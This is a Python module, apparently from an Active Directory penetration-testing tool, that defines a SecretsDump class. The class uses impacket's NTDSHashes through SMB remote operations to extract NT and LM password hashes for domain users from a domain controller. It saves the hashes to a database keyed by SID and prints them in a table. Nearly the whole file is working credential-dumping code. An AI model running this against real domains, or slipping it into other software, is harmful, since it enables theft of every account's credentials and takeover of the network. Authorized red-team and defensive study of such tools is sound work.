from pathlib import Path
from typing import Self

from impacket.examples.secretsdump import (  # pyright: ignore [reportMissingTypeStubs]
    NTDSHashes,
)
from rich.table import Table

from yanimt._database.manager import DatabaseManager
from yanimt._database.models import User
from yanimt._smb.main import Smb
from yanimt._util.consts import TABLE_STYLE
from yanimt._util.smart_class import ADAuthentication, DCValues
from yanimt._util.types import Display, SmbState


class SecretsDump(Smb):
    def __init__(
        self,
        display: Display,
        databse: DatabaseManager,
        dc_values: DCValues,
        ad_authentication: ADAuthentication,
    ) -> None:
        super().__init__(
            display, databse, dc_values, ad_authentication, state=SmbState.REMOTEOPS
        )

        self.ntds_hashes = None
        self.users = None

    def __enter__(self) -> Self:
        super().__enter__()
        if self.domain_sid is None:
            self.pull_domain_sid()
        return self

    def __process_hash(self, secret_type: NTDSHashes.SECRET_TYPE, secret: str) -> None:
        if secret_type is not NTDSHashes.SECRET_TYPE.NTDS:  # pyright: ignore [reportUnnecessaryComparison]
            return
        try:
            splited_secret = secret.split(":")
            if len(splited_secret) < 7 or splited_secret[-7].endswith("$"):  # noqa: PLR2004
                return

            rid = splited_secret[-6]
            user = User(sid=f"{self.domain_sid}-{rid}")

            user.nt_hash = splited_secret[-4]
            user.lm_hash = splited_secret[-5]

            self.users[user.sid] = self.database.put_user(user)  # pyright: ignore [reportOptionalSubscript]
            self.display.progress.advance(self.display.progress.task_ids[0])
        except Exception as e:
            if self.display.debug:
                self.display.logger.exception(
                    "Skipping item, cannot process due to error"
                )
            else:
                self.display.logger.warning(
                    "Skipping item, cannot process due to error -> %s", e
                )

    def cleanup(self) -> None:
        super().cleanup()
        if self.ntds_hashes is not None:
            try:
                self.ntds_hashes.finish()
            except Exception as e:
                self.display.logger.warning("Can't close lsass esent db file -> %s", e)

            resume_file = None
            try:
                resume_file = self.ntds_hashes.getResumeSessionFile()
                if (
                    resume_file is not None
                    and (resume_path := Path(resume_file)).is_file()
                ):
                    resume_path.unlink()
            except Exception as e:
                self.display.logger.warning(
                    "Can't remove resume file -> File : %s | Error : %s", resume_file, e
                )

    def pull_secrets(self) -> None:
        if self.remote_ops is None:
            self.init_remote_ops()
        if self.domain_sid is None:
            self.pull_domain_sid()

        self.users = {}
        self.ntds_hashes = NTDSHashes(
            None,
            None,
            isRemote=True,
            history=False,
            noLMHash=False,
            remoteOps=self.remote_ops,
            useVSSMethod=False,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=None,
            justUser=None,
            ldapFilter=None,
            printUserStatus=False,
            perSecretCallback=self.__process_hash,
        )
        task = self.display.progress.add_task("[blue]Dumping Hashes[/blue]", total=None)
        try:
            with self.display.progress:
                self.display.logger.opsec(
                    "[SMB -> %s] Dumping Hashes", self.dc_values.ip
                )
                self.ntds_hashes.dump()
                self.display.logger.info("Found %s users", len(self.users))
        finally:
            self.display.progress.remove_task(task)

    def get_secrets(self) -> dict[str, User]:
        if self.users is None:
            self.pull_secrets()

        return self.users  # pyright: ignore [reportReturnType]

    def display_secrets(self) -> None:
        if self.users is None:
            self.pull_secrets()

        table = Table(title="Secrets")
        table.add_column(
            "Sam account name", justify="center", style=TABLE_STYLE, no_wrap=True
        )
        table.add_column("LM Hash", justify="center", style=TABLE_STYLE)
        table.add_column("NT Hash", justify="center", style=TABLE_STYLE)
        table.add_column("SID", justify="center", style=TABLE_STYLE)
        for sid, user in self.users.items():  # pyright: ignore [reportOptionalMemberAccess]
            table.add_row(user.sam_account_name, user.lm_hash, user.nt_hash, sid)
        self.display.print_page(table)
